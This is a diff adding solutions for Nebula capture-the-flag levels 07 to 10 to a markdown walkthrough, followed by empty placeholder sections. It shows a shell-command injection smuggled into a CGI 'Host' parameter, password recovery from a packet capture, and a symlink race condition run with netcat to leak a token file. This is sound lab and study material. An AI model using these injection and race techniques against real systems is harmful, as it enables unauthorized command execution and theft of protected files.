@@ -85,3 +85,114 @@ flag06@nebula:~$ getflag
 You have successfully executed getflag on a target account
 ```
 
+## 07
+```console
+level07@nebula:~$ wget -O - http://127.0.0.1:7007/index.cgi?Host="-c 0 localhost | getflag"
+--2018-04-03 14:18:19--  http://127.0.0.1:7007/index.cgi?Host=-c%200%20localhost%20%7C%20getflag
+Connecting to 127.0.0.1:7007... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: unspecified [text/html]
+Saving to: `STDOUT'
+
+    [<=>                                                       ] 0           --.-K/s              <html><head><title>Ping results</title></head><body><pre>You have successfully executed getflag on a target account
+    [ <=>                                                      ] 136         --.-K/s   in 0.003s  
+
+2018-04-03 14:18:19 (50.8 KB/s) - written to stdout [136]
+```
+
+## 08
+Locate the pcap capture file, copy it off to a system where you can run Wireshark on it.
+
+Within Wireshark, follow the TCP stream, although you'll need to switch "Show data as" to "Hex Dump" to see that the '.'s are 7f's, i.e. DELs
+```console
+level08@nebula:~$ su - flag08
+Password: 
+flag08@nebula:~$ getflag 
+You have successfully executed getflag on a target account
+flag08@nebula:~$ 
+```
+
+## 09
+I skipped this one, after some initial investigations
+
+## 10
+This one's a "time-of-use to time-of-check" vulnerability and relies on swapping the target between the access check and the open calls.
+My instinct is to try for a one-shot approach, but actually, the required info can be easiest obtained by having 3 processes going, as follows:
+1. This is simply a network listener set to keep listening - `nc -lk 18211`
+2. This is process continuously loops trying to read a target - `while true; do ../flag10/flag10 target 127.0.0.1; done`
+3. While this process continuously swaps the target between pointing to an accessable file and the token file - `while true; do ln -sf dummy target; ln -sf ../flag10/token target; done` 
+Quiet quickly, you should see the token on the console of process 1
+```console
+.oO Oo.
+dummy
+.oO Oo.
+dummy
+.oO Oo.
+dummy
+.oO Oo.
+dummy
+.oO Oo.
+615a2ce1-b2b5-4c76-8eed-8aa5c4015c27
+.oO Oo.
+615a2ce1-b2b5-4c76-8eed-8aa5c4015c27
+.oO Oo.
+615a2ce1-b2b5-4c76-8eed-8aa5c4015c27
+.oO Oo.
+615a2ce1-b2b5-4c76-8eed-8aa5c4015c27
+.oO Oo.
+dummy
+.oO Oo.
+615a2ce1-b2b5-4c76-8eed-8aa5c4015c27
+...
+```
+
+## nn
+```console
+
+```
+
+## nn
+```console
+
+```
+
+## nn
+```console
+
+```
+
+## nn
+```console
+
+```
+
+## nn
+```console
+
+```
+
+## nn
+```console
+
+```
+
+## nn
+```console
+
+```
+
+## nn
+```console
+
+```
+
+## nn
+```console
+
+```
+
+## nn
+```console
+
+```
+
